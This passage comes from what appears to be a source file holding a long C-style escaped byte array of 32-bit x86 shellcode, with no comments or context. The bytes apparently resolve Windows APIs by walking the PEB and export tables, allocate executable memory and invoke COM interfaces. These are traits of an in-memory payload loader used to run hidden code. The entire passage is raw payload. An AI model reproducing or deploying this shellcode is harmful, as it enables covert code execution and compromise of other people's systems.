"\x03\xc3\x50\x57\xff\x96\xcc\x00\x00\x00\x8b\x44\x24\x14\x01\x44"
"\x24\x10\x8d\x44\x24\x14\x6a\x00\x6a\x00\x50\x57\xff\x96\xd4\x00"
"\x00\x00\x85\xc0\x75\x93\x8d\x86\x84\x00\x00\x00\x89\x44\x24\x18"
"\x85\xdb\x0f\x84\x9b\x00\x00\x00\xeb\x44\x39\x5c\x24\x10\x0f\x84"
"\x8f\x00\x00\x00\xff\x74\x24\x10\x8d\x86\x84\x00\x00\x00\x6a\x01"
"\xff\x10\x50\xff\x56\x7c\x8b\xd8\x85\xdb\x74\x77\x83\x64\x24\x24"
"\x00\x8d\x44\x24\x24\x50\xff\x74\x24\x14\x53\x57\xff\x96\xcc\x00"
"\x00\x00\x8b\xe8\x8d\x86\x84\x00\x00\x00\x89\x44\x24\x18\x83\x7c"
"\x24\x10\x00\x74\x4e\x6a\x04\x68\x00\x30\x00\x00\xff\x74\x24\x18"
"\x6a\x00\xff\x56\x3c\x89\x86\x60\x0d\x00\x00\x85\xc0\x74\x13\xff"
"\x74\x24\x10\x53\x50\xe8\x17\x24\x00\x00\x33\xed\x83\xc4\x0c\x45"
"\xeb\x02\x33\xed\xff\x74\x24\x10\x6a\x00\x53\xe8\x25\x24\x00\x00"
"\x8b\x44\x24\x24\x83\xc4\x0c\x53\x6a\x01\xff\x10\x50\xff\x96\x88"
"\x00\x00\x00\x57\xff\x96\xd0\x00\x00\x00\xff\x74\x24\x30\xff\x96"
"\xd0\x00\x00\x00\xff\x74\x24\x34\xff\x96\xd0\x00\x00\x00\x85\xed"
"\x74\x4e\x83\xbe\x34\x02\x00\x00\x03\x75\x45\xff\xb6\x58\x0d\x00"
"\x00\x8b\xbe\x60\x0d\x00\x00\x8d\x86\x48\x0d\x00\x00\x57\x50\x8d"
"\x86\x38\x0d\x00\x00\x50\xe8\x9e\x20\x00\x00\xff\x76\x2c\x8d\x86"
"\x2c\x0c\x00\x00\xff\x76\x28\x50\xe8\x62\x1f\x00\x00\x83\xc4\x1c"
"\x3b\x87\x18\x05\x00\x00\x75\x0c\x3b\x97\x1c\x05\x00\x00\x75\x04"
"\x8b\xc5\xeb\x02\x33\xc0\x5f\x5e\x5d\x5b\x81\xc4\xec\x02\x00\x00"
"\xc3\x81\xec\xdc\x01\x00\x00\x53\x55\x56\x8b\xb4\x24\xf0\x01\x00"
"\x00\x57\x8b\x6e\x3c\x8b\x44\x2e\x78\x85\xc0\x0f\x84\xe5\x00\x00"
"\x00\x8d\x3c\x30\x8b\x5f\x18\x85\xdb\x0f\x84\xd7\x00\x00\x00\x8b"
"\x47\x1c\x33\xd2\x03\xc6\x89\x54\x24\x10\x89\x44\x24\x24\x8b\x47"
"\x20\x03\xc6\x89\x44\x24\x14\x8b\x47\x24\x03\xc6\x89\x44\x24\x20"
"\x8b\x47\x0c\x03\xc6\x8a\x08\x84\xc9\x74\x2a\x8b\x74\x24\x10\x8d"
"\x94\x24\xe8\x00\x00\x00\x2b\xd0\x80\xc9\x20\x46\x88\x0c\x02\x40"
"\x8a\x08\x84\xc9\x75\xf2\x89\x74\x24\x10\x8b\xb4\x24\xf4\x01\x00"
"\x00\x8b\x54\x24\x10\xff\xb4\x24\x04\x02\x00\x00\x8d\x84\x24\xec"
"\x00\x00\x00\xc6\x84\x14\xec\x00\x00\x00\x00\xff\xb4\x24\x04\x02"
"\x00\x00\x50\xe8\x97\x1e\x00\x00\x89\x44\x24\x24\x83\xc4\x0c\x8b"
"\x44\x24\x14\x83\xc0\xfc\x89\x54\x24\x1c\x8d\x04\x98\x89\x44\x24"
"\x10\xff\xb4\x24\x04\x02\x00\x00\x8b\x08\xff\xb4\x24\x04\x02\x00"
"\x00\x03\xce\x51\xe8\x66\x1e\x00\x00\x33\x44\x24\x24\x83\xc4\x0c"
"\x33\x54\x24\x1c\x3b\x84\x24\xf8\x01\x00\x00\x75\x09\x3b\x94\x24"
"\xfc\x01\x00\x00\x74\x1d\x8b\x44\x24\x10\x83\xe8\x04\x89\x44\x24"
"\x10\x83\xeb\x01\x75\xbb\x33\xc0\x5f\x5e\x5d\x5b\x81\xc4\xdc\x01"
"\x00\x00\xc3\x8b\x44\x24\x20\x8b\x4c\x24\x24\x0f\xb7\x44\x58\xfe"
"\x8b\x14\x81\x03\xd6\x3b\xd7\x72\x76\x8b\x44\x2e\x7c\x03\xc7\x3b"
"\xd0\x73\x6c\x33\xc9\x38\x0a\x74\x1d\x8d\x5c\x24\x28\x8b\xfa\x2b"
"\xda\x83\xf9\x3c\x73\x10\x8a\x07\x88\x04\x3b\x3c\x2e\x74\x07\x41"
"\x47\x80\x3f\x00\x75\xeb\x42\xc7\x44\x0c\x29\x64\x6c\x6c\x00\x03"
"\xca\x33\xd2\x38\x11\x74\x17\x8d\x7c\x24\x68\x2b\xf9\x83\xfa\x7f"
"\x73\x0c\x8a\x01\x42\x88\x04\x0f\x41\x80\x39\x00\x75\xef\x8d\x44"
"\x24\x68\xc6\x44\x14\x68\x00\x50\x8d\x44\x24\x2c\x50\x56\xff\xb4"
"\x24\xfc\x01\x00\x00\xe8\x0c\x00\x00\x00\x83\xc4\x10\x8b\xd0\x8b"
"\xc2\xe9\x62\xff\xff\xff\x55\x8b\xec\x64\xa1\x18\x00\x00\x00\x33"
"\xc9\x53\x56\x57\x8b\x40\x30\x8b\x7d\x08\x8b\x40\x0c\x8b\x70\x0c"
"\x39\x4e\x18\x74\x2a\x8b\x5d\x0c\x85\xc9\x75\x3f\x39\x5e\x18\x74"
"\x12\x51\xff\x75\x14\xff\x76\x18\x57\xe8\xc3\x1b\x00\x00\x83\xc4"
"\x10\x8b\xc8\x8b\x36\x83\x7e\x18\x00\x75\xdd\x85\xc9\x75\x1c\xff"
"\x75\x10\x57\xe8\x0b\x1b\x00\x00\x59\x59\x85\xc0\x74\x0b\xff\x75"
"\x14\x50\xff\x57\x34\x8b\xc8\xeb\x02\x33\xc9\x5f\x5e\x8b\xc1\x5b"
"\x5d\xc3\x56\x8b\x74\x24\x0c\x57\x33\xff\x8b\x4e\x18\x85\xc9\x74"
"\x09\x8b\x01\x51\xff\x50\x08\x89\x7e\x18\x8b\x4e\x1c\x85\xc9\x74"
"\x09\x8b\x01\x51\xff\x50\x08\x89\x7e\x1c\x8b\x4e\x14\x85\xc9\x74"
"\x09\x8b\x01\x51\xff\x50\x08\x89\x7e\x14\x8b\x4e\x08\x85\xc9\x74"
"\x1e\xff\x76\x10\x8b\x01\x51\xff\x50\x50\x8b\x46\x08\x50\x8b\x08"
"\xff\x51\x2c\x8b\x46\x08\x50\x8b\x08\xff\x51\x08\x89\x7e\x08\x8b"
"\x4e\x10\x85\xc9\x74\x09\x8b\x01\x51\xff\x50\x08\x89\x7e\x10\x8b"
"\x4e\x0c\x85\xc9\x74\x09\x8b\x01\x51\xff\x50\x08\x89\x7e\x0c\x8b"
"\x4e\x04\x85\xc9\x74\x09\x8b\x01\x51\xff\x50\x08\x89\x7e\x04\x8b"
"\x0e\x85\xc9\x74\x08\x8b\x01\x51\xff\x50\x08\x89\x3e\x5f\x5e\xc3"
"\x8b\x44\x24\x04\x83\xc0\x10\xf0\xff\x00\x8b\x00\xc2\x04\x00\xb8"
"\x01\x40\x00\x80\xc2\x0c\x00\xb8\x01\x40\x00\x80\xc2\x10\x00\x8b"
"\x44\x24\x04\xff\x74\x24\x18\xff\x74\x24\x14\x8b\x40\x08\xff\x74"
"\x24\x14\x50\x8b\x08\xff\x51\x28\xc2\x18\x00\xb8\x01\x40\x00\x80"
"\xc2\x14\x00\x57\x8b\x7c\x24\x14\x85\xff\x75\x07\xb8\x03\x40\x00"
"\x80\xeb\x16\x56\x8b\x74\x24\x0c\x8b\x46\x08\x50\x8b\x08\xff\x51"
"\x04\x8b\x46\x08\x89\x07\x33\xc0\x5e\x5f\xc2\x10\x00\x8b\x44\x24"
"\x08\x85\xc0\x75\x07\xb8\x03\x40\x00\x80\xeb\x08\xc7\x00\x01\x00"
"\x00\x00\x33\xc0\xc2\x08\x00\x55\x8b\xec\xff\x75\x28\x8b\x45\x08"
"\xff\x75\x24\xff\x75\x20\x8b\x48\x08\xff\x75\x1c\xff\x75\x18\x8b"
"\x11\xff\x75\x0c\x50\x51\xff\x52\x2c\x5d\xc2\x24\x00\x55\x8b\xec"
"\x81\xec\x04\x02\x00\x00\x53\x56\x57\xe8\x8b\x19\x00\x00\x8b\x75"
"\x0c\xb9\x7a\x1f\x40\x00\xbf\x7b\x36\x40\x00\x2b\xcf\x03\xc1\x8b"
"\x0e\x89\x01\xe8\x71\x19\x00\x00\xb9\x32\x1c\x40\x00\x2b\xcf\x03"
"\xc1\x8b\x0e\x89\x41\x04\xe8\x5e\x19\x00\x00\xb9\x03\x20\x40\x00"
"\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x08\xe8\x4b\x19\x00\x00\xb9\x9f"
"\x1c\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x0c\xe8\x38\x19\x00"
"\x00\xb9\x75\x1c\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x10\xe8"
"\x25\x19\x00\x00\xb9\x51\x1c\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89"
"\x41\x14\xe8\x12\x19\x00\x00\xb9\xb9\x1c\x40\x00\x2b\xcf\x03\xc1"
"\x8b\x0e\x89\x41\x18\xe8\xff\x18\x00\x00\xb9\x1c\x12\x40\x00\x2b"
"\xcf\x03\xc1\x8b\x0e\x89\x41\x1c\xe8\xec\x18\x00\x00\xb9\x2e\x11"
"\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x20\xe8\xd9\x18\x00\x00"
"\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x24\xe8\xc6"
"\x18\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41"
"\x28\xe8\xb3\x18\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b"
"\x0e\x89\x41\x2c\xe8\xa0\x18\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf"
"\x03\xc1\x8b\x0e\x89\x41\x30\xe8\x8d\x18\x00\x00\xb9\xeb\x1f\x40"
"\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x34\xe8\x7a\x18\x00\x00\xb9"
"\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x38\xe8\x67\x18"
"\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x3c"
"\xe8\x54\x18\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e"
"\x89\x41\x40\xe8\x41\x18\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03"
"\xc1\x8b\x0e\x89\x41\x44\xe8\x2e\x18\x00\x00\xb9\x2e\x11\x40\x00"
"\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x48\xe8\x1b\x18\x00\x00\xb9\x2e"
"\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x4c\xe8\x08\x18\x00"
"\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x50\xe8"
"\xf5\x17\x00\x00\xb9\x49\x1c\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89"
"\x41\x54\xe8\xe2\x17\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1"
"\x8b\x0e\x89\x41\x58\xe8\xcf\x17\x00\x00\xb9\x6d\x1c\x40\x00\x2b"
"\xcf\x03\xc1\x8b\x0e\x89\x41\x5c\xe8\xbc\x17\x00\x00\xb9\x2e\x11"
"\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x60\xe8\xa9\x17\x00\x00"
"\xb9\x13\x20\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41\x64\xe8\x96"
"\x17\x00\x00\xb9\x41\x1c\x40\x00\x2b\xcf\x03\xc1\x8b\x0e\x89\x41"
"\x68\xe8\x83\x17\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf\x03\xc1\x8b"
"\x0e\x89\x41\x6c\xe8\x70\x17\x00\x00\xb9\x2e\x11\x40\x00\x2b\xcf"
"\x03\xc1\x8b\x0e\x89\x41\x70\xe8\x5d\x17\x00\x00\xb9\x2e\x11\x40"
"\x00\x2b\xcf\x8b\x7d\x08\x03\xc1\x8b\x0e\x89\x41\x74\x8d\x85\xfc"
"\xfd\xff\xff\x83\x66\x10\x00\x50\x8d\x87\x19\x06\x00\x00\x89\x7e"
"\x14\x50\x57\xe8\x16\x17\x00\x00\x83\xc4\x0c\x8d\x5e\x04\x8d\x85"
"\xfc\xfd\xff\xff\x53\x50\xff\x97\xb8\x00\x00\x00\x85\xc0\x75\x13"
"\x8b\x0b\x8d\x46\x08\x50\x8d\x87\xc0\x08\x00\x00\x50\x8b\x11\x51"
"\xff\x52\x18\x5f\x5e\x5b\xc9\xc3\x8b\x54\x24\x0c\x85\xd2\x75\x07"
"\xb8\x03\x40\x00\x80\xeb\x5f\x53\x8b\x5c\x24\x0c\x33\xc9\x56\x8b"
"\x74\x24\x0c\x57\x8b\x7e\x14\x8b\x84\x8f\x30\x08\x00\x00\x3b\x04"
"\x8b\x75\x08\x41\x83\xf9\x04\x75\xee\xeb\x2a\x33\xc9\x8b\x84\x8f"
"\x40\x08\x00\x00\x3b\x04\x8b\x75\x08\x41\x83\xf9\x04\x75\xee\xeb"
"\x14\x33\xc9\x8b\x84\x8f\xc0\x08\x00\x00\x3b\x04\x8b\x75\x0c\x41"
"\x83\xf9\x04\x75\xee\x89\x32\x33\xc0\xeb\x08\x83\x22\x00\xb8\x02"
"\x40\x00\x80\x5f\x5e\x5b\xc2\x0c\x00\x8b\x44\x24\x04\x6a\x00\x6a"
"\x00\x6a\xfd\x8b\x40\x0c\x50\x8b\x08\xff\x51\x38\x33\xc0\xc2\x08"
"\x00\x8b\x4c\x24\x04\x83\xc8\xff\xf0\x0f\xc1\x41\x10\x48\xc2\x04"
"\x00\x8b\x44\x24\x04\xff\x74\x24\x08\x8b\x40\x14\xff\x50\x4c\x33"
"\xc0\xc2\x08\x00\x55\x8b\xec\x81\xec\x80\x00\x00\x00\x56\x8b\x75"
"\x08\x57\x81\xc6\x70\x04\x00\x00\x8a\x0e\x33\xc0\x84\xc9\x74\x3f"
"\x8d\x7d\x80\x8b\xd6\x2b\xfe\x80\xf9\x3b\x74\x12\x3d\x80\x00\x00"
"\x00\x7d\x0b\x88\x0c\x17\x40\x42\x8a\x0a\x84\xc9\x75\xe9\x85\xc0"
"\x74\x1d\xff\x75\x0c\x46\xc6\x44\x05\x80\x00\x03\xf0\x8d\x45\x80"
"\x50\xe8\xb4\x1c\x00\x00\x59\x59\x85\xc0\x75\xbc\x40\xeb\x02\x33"
"\xc0\x5f\x5e\xc9\xc3\x55\x8b\xec\x83\xec\x1c\x83\x7d\x0c\x00\x74"
"\x31\x6a\x1c\x8d\x45\xe4\x50\x8b\x45\x08\xff\x75\x0c\xff\x50\x44"
"\x83\xf8\x1c\x75\x1d\x81\x7d\xf4\x00\x10\x00\x00\x75\x14\x81\x7d"
"\xfc\x00\x00\x02\x00\x75\x0b\x83\x7d\xf8\x04\x75\x05\x33\xc0\x40"
"\xc9\xc3\x33\xc0\xc9\xc3\x81\xec\x14\x02\x00\x00\x53\x8b\x9c\x24"
"\x24\x02\x00\x00\x33\xc0\x21\x44\x24\x04\x55\x8b\xac\x24\x24\x02"
"\x00\x00\x56\x57\x8b\xbc\x24\x28\x02\x00\x00\x8b\x8f\xe8\x00\x00"
"\x00\x85\xc9\x0f\x84\x82\x00\x00\x00\x53\x8d\x87\x60\x08\x00\x00"
"\x50\x8d\x87\x50\x08\x00\x00\x50\xff\xd1\x85\xc0\x0f\x88\x9d\x00"
"\x00\x00\x8d\x44\x24\x24\x50\x8d\x45\x0c\x50\x57\xe8\x3d\x15\x00"
"\x00\x8b\x13\x8d\x73\x04\x83\xc4\x0c\x8d\x87\x70\x08\x00\x00\x8b"
"\x0a\x56\x50\x8d\x44\x24\x2c\x50\x52\xff\x51\x0c\x85\xc0\x78\x34"
"\x8b\x06\x8d\x54\x24\x14\x52\x50\x8b\x08\xff\x51\x28\x85\xc0\x78"
"\x33\x83\x7c\x24\x14\x00\x74\x1f\x8b\x0e\x8d\x43\x08\x50\x8d\x87"
"\x90\x08\x00\x00\x50\x8b\x11\x8d\x87\x80\x08\x00\x00\x50\x51\xff"
"\x52\x24\xeb\x03\x83\x26\x00\x85\xc0\x78\x09\x83\xbf\xe8\x00\x00"
"\x00\x00\x75\x1c\x8d\x43\x08\x50\x8d\x87\x90\x08\x00\x00\x50\x8d"
"\x87\x80\x08\x00\x00\x50\x6a\x00\x6a\x00\xff\x97\xe4\x00\x00\x00"
"\x85\xc0\x79\x10\x83\x63\x08\x00\x33\xc0\xe9\x1b\x01\x00\x00\x83"
"\x23\x00\xeb\xd0\x8b\x43\x08\x50\x8b\x08\xff\x51\x28\x85\xc0\x0f"
"\x88\x01\x01\x00\x00\x8d\x85\x0c\x01\x00\x00\x80\x38\x00\x8d\x73"
"\x0c\x75\x0c\x8b\x43\x08\x56\x50\x8b\x08\xff\x51\x34\xeb\x3e\x8d"
"\x4c\x24\x24\x51\x50\x57\xe8\x73\x14\x00\x00\x83\xc4\x0c\x8d\x44"
"\x24\x24\x50\xff\x97\xb0\x00\x00\x00\x8b\x4b\x08\x8b\xf0\x8d\x43"
"\x0c\x50\x6a\x00\x8b\x11\x56\x51\xff\x52\x30\x56\x89\x44\x24\x1c"
"\xff\x97\xb4\x00\x00\x00\x8b\x44\x24\x18\x8d\x73\x0c\x85\xc0\x0f"
"\x88\xa1\x00\x00\x00\x8b\x16\x8d\x43\x10\x50\x8d\x87\xa0\x08\x00"
"\x00\x50\x8b\x0a\x52\xff\x11\x85\xc0\x0f\x88\x87\x00\x00\x00\x8b"
"\x85\x24\x05\x00\x00\x83\x64\x24\x20\x00\x89\x44\x24\x1c\x8d\x44"
"\x24\x1c\x50\x6a\x01\x6a\x11\xff\x97\x98\x00\x00\x00\x8b\xf0\x85"
"\xf6\x74\x63\x8b\x56\x0c\x33\xc9\x39\x8d\x24\x05\x00\x00\x76\x13"
"\x8a\x84\x29\x28\x05\x00\x00\x88\x04\x0a\x41\x3b\x8d\x24\x05\x00"
"\x00\x72\xed\x8b\x4b\x10\x8d\x43\x14\x50\x56\x51\x8b\x11\xff\x92"
"\xb4\x00\x00\x00\xf7\xd8\x1b\xc0\x33\xd2\x40\x8b\xca\x89\x44\x24"
"\x10\x8b\x46\x0c\x39\x95\x24\x05\x00\x00\x76\x13\x88\x94\x29\x28"
"\x05\x00\x00\x88\x14\x08\x41\x3b\x8d\x24\x05\x00\x00\x72\xed\x56"
"\xff\x97\xa4\x00\x00\x00\x8b\x44\x24\x10\x5f\x5e\x5d\x5b\x81\xc4"
"\x14\x02\x00\x00\xc3\x81\xec\x38\x01\x00\x00\x53\x55\x56\x8b\xb4"
"\x24\x48\x01\x00\x00\x57\xff\x76\x2c\xff\x76\x28\xff\x76\x4c\xff"
"\x76\x48\x56\xe8\x84\x15\x00\x00\xff\x76\x2c\x8b\xf8\xff\x76\x28"
"\x89\x7c\x24\x38\xff\x76\x54\xff\x76\x50\x56\xe8\x6c\x15\x00\x00"
"\xff\x76\x2c\x8b\xd8\xff\x76\x28\x89\x5c\x24\x44\xff\xb6\xec\x01"
"\x00\x00\xff\xb6\xe8\x01\x00\x00\x56\xe8\x4e\x15\x00\x00\x83\xc4"
"\x3c\x8b\xe8\x89\x6c\x24\x10\x85\xff\x74\x28\x85\xdb\x74\x24\x85"
"\xed\x74\x20\x6a\x04\x68\x00\x30\x00\x00\xff\x36\x33\xdb\x53\xff"
"\xd7\x8b\xf8\x85\xff\x75\x1a\x83\xbe\x30\x02\x00\x00\x02\x75\x03"
"\x53\xff\xd5\x83\xc8\xff\x5f\x5e\x5d\x5b\x81\xc4\x38\x01\x00\x00"
"\xc3\xff\x36\x56\x57\xe8\x77\x19\x00\x00\x6a\x20\x8d\x44\x24\x34"
"\x53\x50\xe8\x8e\x19\x00\x00\x83\xc4\x18\x8d\x5f\x28\x83\xbf\x34"
"\x02\x00\x00\x03\x75\x48\x8b\x07\x2d\x3c\x02\x00\x00\x50\x8d\x87"
"\x3c\x02\x00\x00\x50\x8d\x47\x14\x50\x8d\x47\x04\x50\xe8\x37\x16"
"\x00\x00\xff\x73\x04\x8d\x87\x2c\x0c\x00\x00\xff\x33\x50\xe8\xfc"
"\x14\x00\x00\x83\xc4\x1c\x3b\x87\x30\x0d\x00\x00\x0f\x85\x5b\x02"
"\x00\x00\x3b\x97\x34\x0d\x00\x00\x0f\x85\x4f\x02\x00\x00\xff\x73"
"\x04\xff\x33\xff\x77\x34\xff\x77\x30\x57\xe8\x8d\x14\x00\x00\x83"
"\xc4\x14\x89\x47\x30\x85\xc0\x0f\x84\x66\xff\xff\xff\x8d\xb7\x40"
"\x02\x00\x00\x8a\x0e\x33\xc0\x84\xc9\x74\x3a\x8d\x6c\x24\x44\x8b"
"\xd6\x2b\xee\x80\xf9\x3b\x74\x12\x3d\x04\x01\x00\x00\x73\x0b\x88"
"\x0c\x2a\x40\x42\x8a\x0a\x84\xc9\x75\xe9\x85\xc0\x74\x17\x46\xc6"
"\x44\x04\x44\x00\x03\xf0\x8d\x44\x24\x44\x50\x57\xe8\x42\x12\x00"
"\x00\x59\x59\xeb\xbe\x33\xed\x45\x39\xaf\x3c\x02\x00\x00\x76\x57"
"\x8d\x47\x34\x8d\x77\x38\x89\x44\x24\x18\xff\x73\x04\xff\x33\xff"
"\x76\x04\xff\x36\x57\xe8\x12\x14\x00\x00\x8b\x4c\x24\x2c\x83\xc4"
"\x14\x89\x01\x85\xc0\x75\x1d\x8b\x06\x3b\x87\xa0\x01\x00\x00\x0f"
"\x85\xa4\x01\x00\x00\x8b\x46\x04\x3b\x87\xa4\x01\x00\x00\x0f\x85"
"\x95\x01\x00\x00\x45\x83\xc1\x04\x83\xc6\x08\x89\x4c\x24\x18\x3b"
"\xaf\x3c\x02\x00\x00\x72\xb3\x8b\x87\x20\x09\x00\x00\x6a\x02\x5d"
"\x3b\xc5\x75\x17\x57\xe8\x0f\xf1\xff\xff\x59\x85\xc0\x0f\x84\x66"
"\x01\x00\x00\x8b\xb7\x60\x0d\x00\x00\xeb\x18\x83\xf8\x03\x0f\x84"
"\x55\x01\x00\x00\x8d\xb7\x60\x0d\x00\x00\x83\xf8\x01\x74\x04\x8b"
"\x74\x24\x1c\x83\xbf\x70\x05\x00\x00\x01\x74\x2e\x57\xe8\x73\xef"
"\xff\xff\x59\x85\xc0\x75\x0c\x39\xaf\x70\x05\x00\x00\x0f\x84\x26"
"\x01\x00\x00\x57\xe8\x57\xf0\xff\xff\x59\x85\xc0\x75\x0c\x39\xaf"
"\x70\x05\x00\x00\x0f\x84\x0f\x01\x00\x00\x83\x7e\x08\x01\x0f\x84"
"\x9c\x00\x00\x00\x8b\x86\x24\x05\x00\x00\x6a\x04\x05\x2f\x15\x00"
"\x00\x68\x00\x30\x00\x00\x25\x00\xf0\xff\xff\x50\x6a\x00\xff\x54"
"\x24\x2c\x8b\xd8\x85\xdb\x0f\x84\xdd\x00\x00\x00\x68\x30\x05\x00"
"\x00\x56\x53\xe8\x99\x17\x00\x00\x83\xc4\x0c\x83\x7e\x08\x03\x74"
"\x22\x83\x7e\x08\x04\x74\x1c\x39\x6e\x08\x75\x54\x8d\x83\x28\x05"
"\x00\x00\x50\x8d\x86\x28\x05\x00\x00\x50\xe8\x75\x15\x00\x00\x59"
"\x59\xeb\x3b\x8d\x44\x24\x20\xb9\x00\x01\x00\x00\x50\xff\xb6\x20"
"\x05\x00\x00\x8d\x86\x28\x05\x00\x00\x50\xff\xb6\x24\x05\x00\x00"
"\x8d\x83\x28\x05\x00\x00\x50\x66\x8b\x46\x08\x66\x48\x66\x0b\xc1"
"\x0f\xb7\xc0\x50\xff\x97\x18\x01\x00\x00\x85\xc0\x75\x6b\x8b\xf3"
"\x83\x3e\x03\x74\x50\x83\x3e\x04\x74\x4b\x83\x3e\x01\x74\x17\x39"
"\x2e\x74\x13\x83\x3e\x05\x74\x05\x83\x3e\x06\x75\x41\x56\x57\xe8"
"\x8f\x0c\x00\x00\xeb\x36\x8d\x44\x24\x24\x50\x56\x57\xe8\xd4\xfa"
"\xff\xff\x83\xc4\x0c\x85\xc0\x74\x0f\x8d\x44\x24\x24\x50\x56\x57"
"\xe8\xa0\x00\x00\x00\x83\xc4\x0c\x8d\x44\x24\x24\x50\x57\xe8\x7f"
"\xf5\xff\xff\xeb\x07\x56\x57\xe8\xe9\x03\x00\x00\x59\x59\x83\xbf"
"\x30\x02\x00\x00\x03\x75\x02\xeb\xfe\x8b\x6c\x24\x10\x8b\x87\x20"
"\x09\x00\x00\x83\xf8\x02\x74\x05\x83\xf8\x03\x75\x37\x8b\x87\x60"
"\x0d\x00\x00\x85\xc0\x74\x2d\xff\xb7\x58\x0d\x00\x00\x6a\x00\x50"
"\xe8\xc0\x16\x00\x00\x8b\x5c\x24\x20\x83\xc4\x0c\x68\x00\xc0\x00"
"\x00\x6a\x00\xff\xb7\x60\x0d\x00\x00\xff\xd3\x83\xa7\x60\x0d\x00"
"\x00\x00\xeb\x04\x8b\x5c\x24\x14\xff\x37\x8b\xb7\x30\x02\x00\x00"
"\x6a\x00\x57\xe8\x8d\x16\x00\x00\x83\xc4\x0c\x68\x00\xc0\x00\x00"
"\x6a\x00\x57\xff\xd3\x83\xfe\x02\x75\x04\x6a\x00\xff\xd5\x33\xc0"
"\xe9\xc1\xfc\xff\xff\x81\xec\x7c\x02\x00\x00\x53\x8b\x9c\x24\x84"
"\x02\x00\x00\x33\xc0\x55\x56\x8b\xb4\x24\x90\x02\x00\x00\x33\xed"
"\x21\x6c\x24\x18\x57\x8d\x7c\x24\x48\xab\xab\xab\xab\x33\xc0\x83"
"\x3e\x02\x66\x89\x44\x24\x18\x0f\x85\x97\x01\x00\x00\x8b\x84\x24"
"\x98\x02\x00\x00\x8b\x48\x14\x8d\x78\x1c\x57\x51\x8b\x01\xff\x50"
"\x40\x85\xc0\x0f\x88\x74\x01\x00\x00\x8b\x07\x8d\x54\x24\x1c\x52"
"\x50\x8b\x08\xff\x51\x48\x85\xc0\x0f\x88\xe9\x02\x00\x00\x8d\x44"
"\x24\x2c\x50\x6a\x01\xff\x74\x24\x24\xff\x93\xa8\x00\x00\x00\x8d"
"\x44\x24\x28\x50\x6a\x01\xff\x74\x24\x24\xff\x93\xac\x00\x00\x00"
"\x8b\x44\x24\x28\x2b\x44\x24\x2c\x83\xc0\x01\x0f\x84\xe3\x00\x00"
"\x00\x6a\x01\x55\x6a\x0c\xff\x93\x9c\x00\x00\x00\x81\xc6\x0c\x04"
"\x00\x00\x8b\xe8\x80\x3e\x00\x74\x7b\x8d\x84\x24\x88\x00\x00\x00"
"\x50\x56\x53\xe8\xf6\x0e\x00\x00\x83\xc4\x0c\x8d\x44\x24\x14\x50"
"\x8d\x84\x24\x8c\x00\x00\x00\x50\xff\x93\x94\x00\x00\x00\xff\x74"
"\x24\x14\x8b\xf0\xb8\x08\x20\x00\x00\x6a\x00\x6a\x08\x66\x89\x44"
"\x24\x44\xff\x93\x9c\x00\x00\x00\x83\x64\x24\x10\x00\x83\x7c\x24"
"\x14\x00\x89\x44\x24\x40\x76\x66\x33\xc0\xff\x34\x86\xff\x93\xb0"
"\x00\x00\x00\x50\x8d\x44\x24\x14\x50\xff\x74\x24\x48\xff\x93\xa0"
"\x00\x00\x00\x8b\x44\x24\x10\x40\x89\x44\x24\x10\x3b\x44\x24\x14"
"\x72\xd8\xeb\x3a\x6a\x01\x6a\x00\xb8\x08\x20\x00\x00\x6a\x08\x66"
"\x89\x44\x24\x44\xff\x93\x9c\x00\x00\x00\x83\x64\x24\x10\x00\x89"
"\x44\x24\x40\x8d\x44\x24\x18\x50\xff\x93\xb0\x00\x00\x00\x50\x8d"
"\x44\x24\x14\x50\xff\x74\x24\x48\xff\x93\xa0\x00\x00\x00\x83\x64"
"\x24\x10\x00\x8d\x44\x24\x38\x50\x8d\x44\x24\x14\x50\x55\xff\x93"
"\xa0\x00\x00\x00\x83\x64\x24\x50\x00\x8d\x54\x24\x68\x52\x33\xc0"
"\x8d\x74\x24\x4c\x40\x66\x89\x44\x24\x4c\x8b\x07\x55\x83\xec\x10"
"\x8b\xfc\x8b\x08\x50\xa5\xa5\xa5\xa5\xff\x91\x94\x00\x00\x00\x85"
"\xed\x0f\x84\xa0\x01\x00\x00\xff\x74\x24\x40\xff\x93\xa4\x00\x00"
"\x00\x55\xff\x93\xa4\x00\x00\x00\xe9\x8a\x01\x00\x00\x21\x2f\xe9"
"\x83\x01\x00\x00\x8d\x84\x24\x88\x00\x00\x00\x50\x8d\x86\x0c\x02"
"\x00\x00\x50\x53\xe8\xd5\x0d\x00\x00\x83\xc4\x0c\x8d\x84\x24\x88"
"\x00\x00\x00\x50\xff\x93\xb0\x00\x00\x00\x8b\xe8\x89\x6c\x24\x20"
"\x85\xed\x0f\x84\x52\x01\x00\x00\x8d\x84\x24\x88\x00\x00\x00\x50"
"\x8d\x86\x0c\x03\x00\x00\x50\x53\xe8\xa1\x0d\x00\x00\x83\xc4\x0c"
"\x8d\x84\x24\x88\x00\x00\x00\x50\xff\x93\xb0\x00\x00\x00\x89\x44"
"\x24\x24\x85\xc0\x0f\x84\x16\x01\x00\x00\x8b\x8c\x24\x98\x02\x00"
